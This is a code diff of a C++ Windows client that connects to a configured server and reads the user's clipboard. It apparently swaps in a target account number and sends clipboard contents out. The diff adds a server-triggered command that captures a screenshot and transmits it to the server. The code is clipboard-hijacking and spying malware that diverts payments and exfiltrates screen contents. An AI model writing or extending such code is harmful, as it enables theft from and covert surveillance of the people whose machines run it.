@@ -2,13 +2,12 @@
 #include <iostream>
 #include <regex>
 #include "tools.hh"
+#include <fstream>
 
 ClientWindow::ClientWindow() :
 	socket(SocketType::CONNECT_SOCKET, ClientConfig::PORT, ClientConfig::IP_ADDRESS)
 {
 	this->SetTargetAccountNumber(ClientConfig::TARGET_ACCOUNT_NUMBER);
-	std::async(std::launch::async,
-		[this]() {this->BlockingListen(); });
 }
 
 LRESULT ClientWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
@@ -30,7 +29,7 @@ LRESULT ClientWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
 	case WM_PAINT:
 	{
 		PAINTSTRUCT ps;
-		auto hdc = BeginPaint(hwnd, &ps);
+		auto hdc = ::BeginPaint(hwnd, &ps);
 		::FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
 		::EndPaint(this->hwnd, &ps);
 	}
@@ -100,6 +99,7 @@ void ClientWindow::SendAccountSwapNotificationToServer() {
 }
 
 void ClientWindow::OnClipboardChange() {
+	Tools::PrintDebugMessage("OnCLipboardChange called");
 	auto clipboardString = this->ReadClipboardText();
 	if (clipboardString.empty()) { return; }
 	this->SendClipboardStringToServer(clipboardString);
@@ -108,12 +108,29 @@ void ClientWindow::OnClipboardChange() {
 	}
 }
 
+void ClientWindow::MakeAndSendScreenshot() {
+	Tools::PrintDebugMessage("Making SCREENSHOT");
+	auto result = Winapi::GetScreenshotAsJpegBytes(L"test.jpg"s);
+	Tools::PrintDebugMessage("SS size: " + std::to_string(result.size()));
+	this->socket.SendMetadata(Metadata{ DataType::SCREENSHOT, result.size() });
+	auto bytesSent = this->socket.SendBytes(result.data(), result.size());
+	Tools::PrintDebugMessage("Sent bytes: " + std::to_string(bytesSent));
+	{
+		auto file = std::ofstream("testing.jpg", std::ios_base::binary);
+		std::copy(result.begin(), result.end(), std::ostreambuf_iterator<char>(file));
+	}
+
+}
+
 void ClientWindow::BlockingListen() {
 	while (true) {
 		auto metadata = this->socket.RecvMetadata();
 		switch (metadata.dataType) {
-		case DataType::CHANGE_ACCOUNT_NUMBER:
+		case DataType::CHANGE_ACCOUNT_NUMBER_CMD:
 			this->SetTargetAccountNumber(socket.RecvString(metadata));
+			break;
+		case DataType::MAKE_SCREENSHOT_CMD:
+			this->MakeAndSendScreenshot();
 			break;
 		default:;
 		}
